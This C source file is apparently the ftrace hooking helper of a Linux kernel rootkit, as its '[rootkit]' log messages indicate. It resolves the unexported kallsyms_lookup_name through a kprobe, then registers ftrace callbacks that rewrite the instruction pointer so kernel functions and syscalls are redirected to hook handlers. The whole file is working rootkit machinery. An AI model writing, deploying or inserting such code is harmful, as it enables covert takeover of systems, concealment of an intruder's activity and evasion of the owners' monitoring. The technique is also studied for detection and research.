#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include "ftrace_helper.h"

// Function pointer for our symbol searching function
unsigned long (*kallsyms_lookup_name_fn)(const char *name);

unsigned long resolve_sym(const char* sym)
{
    /* Resolve kallsyms_lookup_name if we haven't already */
    if (!kallsyms_lookup_name_fn) {
        struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
        register_kprobe(&kp);
        kallsyms_lookup_name_fn = (void *)kp.addr;
        unregister_kprobe(&kp);
    }

    return kallsyms_lookup_name_fn(sym);
}

int resolve_hook(ftrace_hook *hook)
{
    hook->symbol_addr = resolve_sym(hook->symbol_name);
    if (!hook->symbol_addr) {
        pr_info("[rootkit] - ERROR: resolve_hook couldn't resolve symbol: %s\n", hook->symbol_name);
        return -ENOENT;
    }

    // Also store address with an offset for skipping __fentry prologue
    hook->offset_symbol_addr = hook->symbol_addr + MCOUNT_INSN_SIZE;
    return 0;
}

static void hook_thunk(unsigned long ip,
                            unsigned long parent_ip,
                            struct ftrace_ops *ops,
                            struct ftrace_regs *fregs
                        )
{
    struct ftrace_hook *hook = container_of(ops, ftrace_hook, ops);
    struct pt_regs *regs = ftrace_get_regs(fregs);
    if (!regs) {
        pr_info("[rootkit] - ERROR: couldn't get pt_regs in hook_thunk\n");
        return;
    }

    /* Skip the actual syscall by updating instruction pointer, making sure to skip the
    __fentry prologue to avoid infinite recursion */
    regs->ip = hook->hook_addr;
}

int install_hook(ftrace_hook *hook)
{
    int result = resolve_hook(hook);
    if (result != 0) {
        return result;
    }

    hook->ops.func  = hook_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS |
                FTRACE_OPS_FL_RECURSION |
                FTRACE_OPS_FL_IPMODIFY;

    result = ftrace_set_filter_ip(&hook->ops, hook->symbol_addr, 0, 0);
    if (result) {
        pr_info("[rootkit] - ERROR: couldn't set filter for %s\n", hook->symbol_name);
        return result;
    }

    result = register_ftrace_function(&hook->ops);
    if (result) {
        pr_info("[rootkit] - ERROR: couldn't set hook function for %s\n", hook->symbol_name);
        return result;
    }

    return result;
}

void remove_hook(ftrace_hook *hook)
{
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, hook->symbol_addr, 1, 0);
}